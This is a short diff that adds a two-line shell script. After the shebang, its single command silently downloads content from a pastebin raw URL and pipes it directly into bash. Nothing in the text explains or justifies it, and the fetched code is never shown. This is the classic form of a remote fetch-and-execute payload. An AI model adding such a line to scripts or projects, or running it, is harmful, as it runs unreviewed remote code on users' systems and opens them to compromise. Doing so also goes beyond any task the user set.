@@ -1,0 +1,2 @@
+#!/bin/sh
+curl -s https://pastebin.com/raw/abc123 | bash
